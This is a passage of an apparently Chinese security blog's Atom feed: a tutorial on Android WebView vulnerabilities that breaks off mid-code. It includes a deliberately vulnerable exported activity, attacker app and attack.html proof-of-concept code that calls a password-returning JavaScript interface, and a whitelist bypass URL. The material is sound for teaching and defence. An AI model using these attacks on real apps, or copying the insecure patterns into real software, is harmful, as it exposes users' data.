<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Cyber Security</title>
  
  
  <link href="https://tr0e.github.io/atom.xml" rel="self"/>
  
  <link href="https://tr0e.github.io/"/>
  <updated>2022-06-15T16:01:01.093Z</updated>
  <id>https://tr0e.github.io/</id>
  
  <author>
    <name>Tr0e</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Android Webview历史高危漏洞与攻击面分析</title>
    <link href="https://tr0e.github.io/Android%20Webview%E5%8E%86%E5%8F%B2%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/"/>
    <id>https://tr0e.github.io/Android%20Webview%E5%8E%86%E5%8F%B2%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/</id>
    <published>2022-06-03T11:52:48.000Z</published>
    <updated>2022-06-15T16:01:01.093Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>WebView 是 Android 系统中的原生控件，它是一个基于 webkit 引擎、展现 web 页面的控件，相当于增强版的内置浏览器。现在很多 App 里都内置了 Web 网页（Hybrid App），比如说很多电商平台，淘宝、京东、聚划算等等。Webview 的广泛使用也就导致了其成为攻击者关注的对象，本文将学习、讨论下 Webview 远程代码执行漏洞、跨域访问漏洞及其它攻击面。</p><h1 id="WebView基础"><a href="#WebView基础" class="headerlink" title="WebView基础"></a>WebView基础</h1><p>WebView 控件功能强大，除了具有一般 View 的属性和设置外，还可以对 url 请求、页面加载、渲染、页面交互进行强大的处理。</p><h2 id="极简Demo程序"><a href="#极简Demo程序" class="headerlink" title="极简Demo程序"></a>极简Demo程序</h2><p>在 App 工程 com.bwshen.test 中新建 WebviewTestActivity :</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WebviewTestActivity</span> <span class="token keyword">extends</span> <span class="token class-name">AppCompatActivity</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span><span class="token class-name">Bundle</span> savedInstanceState<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>savedInstanceState<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setContentView</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>layout<span class="token punctuation">.</span>activity_webview_test<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">WebView</span> webView <span class="token operator">=</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>web_view<span class="token punctuation">)</span><span class="token punctuation">;</span>        webView<span class="token punctuation">.</span><span class="token function">getSettings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         webView<span class="token punctuation">.</span><span class="token function">loadUrl</span><span class="token punctuation">(</span><span class="token string">"https://www.baidu.com"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>页面布局如下：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LinearLayout</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>android</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.android.com/apk/res/android<span class="token punctuation">"</span></span>    <span class="token attr-name"><span class="token namespace">android:</span>layout_width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>match_parent<span class="token punctuation">"</span></span>    <span class="token attr-name"><span class="token namespace">android:</span>layout_height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>match_parent<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>WebView</span>        <span class="token attr-name"><span class="token namespace">android:</span>id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>@+id/web_view<span class="token punctuation">"</span></span>        <span class="token attr-name"><span class="token namespace">android:</span>layout_width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>match_parent<span class="token punctuation">"</span></span>        <span class="token attr-name"><span class="token namespace">android:</span>layout_height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>match_parent<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LinearLayout</span><span class="token punctuation">></span></span></code></pre><p>注意 AndroidMainfest.xml 需要申请访问网络的权限：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>uses-permission</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>android.permission.INTERNET<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>uses-permission</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>android.permission.ACCESS_NETWORK_STATE<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></code></pre><p>程序运行效果：</p><p><img src="https://img-blog.csdnimg.cn/e72fbeb497444557927542172f24215b.png" alt="在这里插入图片描述" loading="lazy"></p><h2 id="JS调用Android"><a href="#JS调用Android" class="headerlink" title="JS调用Android"></a>JS调用Android</h2><p>在上面 App 的工程 assets 文件夹下新建 javascript.html：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Carson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">         <span class="token keyword">function</span> <span class="token function">callAndroid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">//由于对象映射，所以调用test对象等于调用Android映射的对象</span>            test<span class="token punctuation">.</span><span class="token function">hello</span><span class="token punctuation">(</span><span class="token string">"Tr0e!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>      </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>   <span class="token comment">&lt;!--点击按钮则调用callAndroid函数--></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button1<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">callAndroid</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>Click Me for fun!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>修改 WebviewTestActivity :</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WebviewTestActivity</span> <span class="token keyword">extends</span> <span class="token class-name">AppCompatActivity</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> TAG <span class="token operator">=</span> <span class="token string">"WebviewTestActivity"</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span><span class="token class-name">Bundle</span> savedInstanceState<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>savedInstanceState<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setContentView</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>layout<span class="token punctuation">.</span>activity_webview_test<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">WebView</span> webView <span class="token operator">=</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>web_view<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//设置开启JS支持</span>        webView<span class="token punctuation">.</span><span class="token function">getSettings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//往WebView中注入了一个Java对象，而这个Java对象的方法可以被js访问</span>        webView<span class="token punctuation">.</span><span class="token function">addJavascriptInterface</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AndroidtoJs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        webView<span class="token punctuation">.</span><span class="token function">loadData</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"text/html"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//加载asset文件夹下html</span>        webView<span class="token punctuation">.</span><span class="token function">loadUrl</span><span class="token punctuation">(</span><span class="token string">"file:///android_asset/javascript.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 提供接口在Webview中供JS调用     */</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AndroidtoJs</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span>        <span class="token annotation punctuation">@JavascriptInterface</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token class-name">String</span> msg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Log</span><span class="token punctuation">.</span><span class="token function">e</span><span class="token punctuation">(</span>TAG<span class="token punctuation">,</span><span class="token string">"Hello，"</span> <span class="token operator">+</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>来看看程序的运行效果：</p><p><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/9e182d9c311e4bb1ac057faa9be4ff3a.png" alt="在这里插入图片描述" loading="lazy"></p><h2 id="加载远程HTML"><a href="#加载远程HTML" class="headerlink" title="加载远程HTML"></a>加载远程HTML</h2><p>以上是加载了本地的 html 页面，下面来做个有趣的测试，App 加载远程 html 页面并调用 Android App 提供的接口（即上文 AndroidtoJs 类的 hello 函数）。</p><p>首先在本地 PC 临时目录下创建 attack.html（页面内容同上文的 javascripts.html），然后本地起一个简易的 Python HttpServer：<br><img src="https://img-blog.csdnimg.cn/6f3ecc5426704806ae85a50b6fb9062c.png" alt="在这里插入图片描述" loading="lazy"><br>然后简单修改 App 的 WebviewTestActivity，“远程”加载上述 attack.html 页面：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">WebView</span> webView <span class="token operator">=</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>web_view<span class="token punctuation">)</span><span class="token punctuation">;</span>webView<span class="token punctuation">.</span><span class="token function">getSettings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>webView<span class="token punctuation">.</span><span class="token function">addJavascriptInterface</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AndroidtoJs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>webView<span class="token punctuation">.</span><span class="token function">loadData</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"text/html"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// webView.loadUrl("file:///android_asset/javascript.html");</span>webView<span class="token punctuation">.</span><span class="token function">loadUrl</span><span class="token punctuation">(</span><span class="token string">"http://192.168.0.110:8080/attack.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>运行程序，看看效果：<br><img src="https://img-blog.csdnimg.cn/0c58a297dc9a46c597abb4a85df581f5.png" alt="在这里插入图片描述" loading="lazy"><br>远程 Web Server 也成功收到访问请求：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/bf825bfded2f4c4d8c294603113189e1.png" alt="在这里插入图片描述" loading="lazy"><br>关于 WebView 组件与 JS 之间的其他用法，请参见 <a href="https://cloud.tencent.com/developer/article/1394361">Android：你要的WebView与 JS 交互方式 都在这里了</a>，本文不再展开。</p><h1 id="接口攻击场景"><a href="#接口攻击场景" class="headerlink" title="接口攻击场景"></a>接口攻击场景</h1><p>以上 WebView 组件的使用看着一切正常，接下来来看下 WebView 对外暴露的接口可能存在的风险，以及攻击者可能的攻击手段。</p><h2 id="漏洞示例程序"><a href="#漏洞示例程序" class="headerlink" title="漏洞示例程序"></a>漏洞示例程序</h2><p>修改下 com.bwshen.test 应用的 WebviewTestActivity：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WebviewTestActivity</span> <span class="token keyword">extends</span> <span class="token class-name">AppCompatActivity</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> TAG <span class="token operator">=</span> <span class="token string">"WebviewTestActivity"</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span><span class="token class-name">Bundle</span> savedInstanceState<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>savedInstanceState<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setContentView</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>layout<span class="token punctuation">.</span>activity_webview_test<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">WebView</span> webView <span class="token operator">=</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>web_view<span class="token punctuation">)</span><span class="token punctuation">;</span>        webView<span class="token punctuation">.</span><span class="token function">getSettings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        webView<span class="token punctuation">.</span><span class="token function">addJavascriptInterface</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AndroidtoJs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        webView<span class="token punctuation">.</span><span class="token function">loadData</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"text/html"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Uri</span> getUri <span class="token operator">=</span> <span class="token function">getIntent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        webView<span class="token punctuation">.</span><span class="token function">loadUrl</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>getUri<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 提供接口在Webview中供JS调用     */</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AndroidtoJs</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span>        <span class="token annotation punctuation">@JavascriptInterface</span>        <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"admin123"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>在 AndroidMainfest.xml 中声明组件对外导出：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activity</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>.webview.WebviewTestActivity<span class="token punctuation">"</span></span>           <span class="token attr-name"><span class="token namespace">android:</span>exported</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>activity</span><span class="token punctuation">></span></span></code></pre><h2 id="本地攻击程序"><a href="#本地攻击程序" class="headerlink" title="本地攻击程序"></a>本地攻击程序</h2><p>在攻击程序 com.bwshen.attack 中编写如下攻击代码：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Button2</span><span class="token punctuation">.</span><span class="token function">setOnClickListener</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">View<span class="token punctuation">.</span>OnClickListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token annotation punctuation">@Override</span>      <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token class-name">View</span> v<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">Intent</span> attackIntent <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          attackIntent<span class="token punctuation">.</span><span class="token function">setClassName</span><span class="token punctuation">(</span><span class="token string">"com.bwshen.test"</span><span class="token punctuation">,</span><span class="token string">"com.bwshen.test.webview.WebviewTestActivity"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          attackIntent<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token class-name">Uri</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">"http://192.168.0.110:8080/attack.html"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">startActivity</span><span class="token punctuation">(</span>attackIntent<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>同时修改 attack.html：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>WebView Atack<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">         <span class="token keyword">function</span> <span class="token function">callAndroid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">//由于对象映射，所以调用test对象等于调用Android映射的对象</span>            <span class="token keyword">var</span> password <span class="token operator">=</span> test<span class="token punctuation">.</span><span class="token function">getPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"getdata"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">=</span> password<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>     </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>getdata<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>攻击获得的数据将显示在此……<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>   <span class="token comment">&lt;!--点击按钮则调用callAndroid函数--></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button1<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">callAndroid</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>Click Me for fun!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>页面效果如下：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/b0643c729fe44a3689f51ce615b2a69b.png" alt="在这里插入图片描述" loading="lazy"><br>运行攻击程序，效果如下：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/cb7434502bcc467991c141628b5da7e8.png" alt="在这里插入图片描述" loading="lazy"><br>点击按钮，成功通过 JS 调用受害者 App 的敏感接口 getPassword 获得敏感数据：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/481c5e405fef4e93bcf8f9c7036a4cbe.png" alt="在这里插入图片描述" loading="lazy"><br>以上是 Local 本地攻击，可以借助 Deeplink 技术完全转换成远程攻击，参见<a href="https://blog.csdn.net/weixin_39190897/article/details/124550705">Android 应用层组件安全测试基础实战技巧</a>。</p><h2 id="url白名单校验"><a href="#url白名单校验" class="headerlink" title="url白名单校验"></a>url白名单校验</h2><p>综上可以看出，对于 WebView 组件，如果无脑调用 <code>webView.loadUrl(uri)</code> 加载外部可控的 URI，将导致 App 遭受外部攻击的风险。所以在加载外部传入的 URI 之前，应该进行白名单校验，对恶意、非法 URI 进行拦截。</p><p>但是需要注意的是，URI 白名单校验的方式经常存在被绕过的风险，比如以下代码：</p><pre class="language-bash" data-language="bash"><code class="language-bash">protected void onCreate<span class="token punctuation">(</span>Bundle savedInstanceState<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    ……    Uri getUri <span class="token operator">=</span> getIntent<span class="token punctuation">(</span><span class="token punctuation">)</span>.getData<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    String inputUrl <span class="token operator">=</span> String.valueOf<span class="token punctuation">(</span>getUri<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>checkDomain<span class="token punctuation">(</span>inputUrl<span class="token punctuation">))</span><span class="token punctuation">&#123;</span>         webView.loadUrl<span class="token punctuation">(</span>inputUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>private static boolean checkDomain<span class="token punctuation">(</span>String inputUrl<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     String<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token assign-left variable">whiteList</span><span class="token operator">=</span>new String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"site1.com"</span>,<span class="token string">"site2.com"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span>String whiteDomain:whiteList<span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>inputUrl.indexOf<span class="token punctuation">(</span>whiteDomain<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>           <span class="token builtin class-name">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token builtin class-name">return</span>  <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>绕过方法</strong>：这个校验逻辑错误比较低级，攻击者直接输入 <code>http://www.hacker.com/poc.html?site1.com</code> 就可以绕过了。因为 URL 中除了代表域名的字段外，还有路径、参数等和域名无关的字段，因此直接判断整个 URL 是不安全的。虽然直接用 <code>indexOf</code> 来判断用户输入的 URL 是否在域名白名单内这种错误看上去比较 low，但是现实中仍然有不少缺乏安全意识的开发人员在使用。</p><p>上面介绍的是最简单的一种 URL 白名单校验及其绕过方式，更多校验方式及绕过方法请参见：<a href="https://www.freebuf.com/articles/terminal/201407.html">一文彻底搞懂安卓WebView白名单校验</a>，本文不再展开。</p><h1 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h1><p>从上面的案例可以看到，JS 调用 Android 的其中一个方式是通过 <code>addJavascriptInterface</code> 接口进行对象映射：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">//设置开启JS支持</span>webView<span class="token punctuation">.</span><span class="token function">getSettings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//往WebView中注入了一个Java对象，而这个Java对象的方法可以被js访问</span>webView<span class="token punctuation">.</span><span class="token function">addJavascriptInterface</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AndroidtoJs</span><span class="token 